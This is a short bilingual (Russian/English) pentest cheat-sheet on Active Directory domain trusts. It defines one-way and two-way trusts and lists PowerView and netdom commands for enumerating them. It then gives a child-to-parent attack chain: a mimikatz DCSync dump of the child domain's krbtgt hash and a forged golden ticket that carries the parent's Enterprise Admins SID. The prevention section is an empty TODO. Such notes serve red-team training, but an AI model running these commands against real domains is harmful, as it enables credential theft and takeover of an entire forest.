# Domain Trusts

## What is this RU 

**Domain Trusts** - это механизмы, которые позволяют различным доменам в сети Active Directory взаимодействовать друг с другом и обмениваться ресурсами.Доверительные отношения между доменами позволяют пользователям в одном домене получать доступ к ресурсам в другом домене. Когда два домена доверяют друг другу, пользователи в этих доменах могут использовать свои учетные записи и пароли для доступа к ресурсам в другом домене.

Существует два типа доверительных отношений между доменами:
<ol>
<li>
    Unidirectional Trust - доверительные отношения однонаправленные. Они позволяют пользователям в одном домене получать доступ к ресурсам в другом домене, но не наоборот.
</li>
<li>
    Bidirectional Trust - двунаправленные доверительные отношения. Они позволяют пользователям в обоих доменах получать доступ к ресурсам в другом домене.
</li>
</ol>    

## What is this EN 

**Domain Trusts** -are mechanisms that allow different domains in an Active Directory network to interact with each other and exchange resources.Domain Trusts enable users in one domain to access resources in another domain. When two domains trust each other, users in those domains can use their account credentials to access resources in the other domain.

There are two types of Domain Trusts: 
<ol>
<li>
    Unidirectional Trusts - These are one-way trusts that allow users in one domain to access resources in another domain, but not the other way around.
</li>
<li>
    Bidirectional Trusts -  These are two-way trusts that allow users in both domains to access resources in the other domain.
</li>
</ol>  

## Enumerating Trust Relationships

Check  domain trust  with  powerview 
```
Get-DomainTrust
```

Using Get-DomainTrustMapping
```
Get-DomainTrustMapping
```

Checking Users in the Child Domain using Get-DomainUser
```
Get-DomainUser -Domain TRUSTED.DOMAIN.LOCAL | select SamAccountName
```

Using netdom to query domain trust
```
netdom query /domain:domain.local trust
```

Using netdom to query workstations and servers
```
netdom query /domain:domain.local workstation
```

## Explotation Child -> Parent Trusts

NTLM user krbtgt of the child domain
```
.\mimikatz.exe "lsadump::dcsync /user:trusted.domain\krbtgt" "exit"
```

The SID of the child domain
```
Get-DomainSID
```

Enterprise Admins group SID for the parent domain
```
Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

Creating a golden ticket for a parent domain from a child domain using mimikatz
```
.\mimikatz.exe "kerberos::golden /user:TARGET_USER_NAME /domain:DOMAIN.LOCAL /sid:CHILD_DOMAIN_SID /krbtgt:HASH_KRBTGT /sids:SID_GROUP_ENETR_ADMIN_PARENT_DOMAIN /ptt" "exit"
```

## TODO Parent > Chils

## Todo Prevent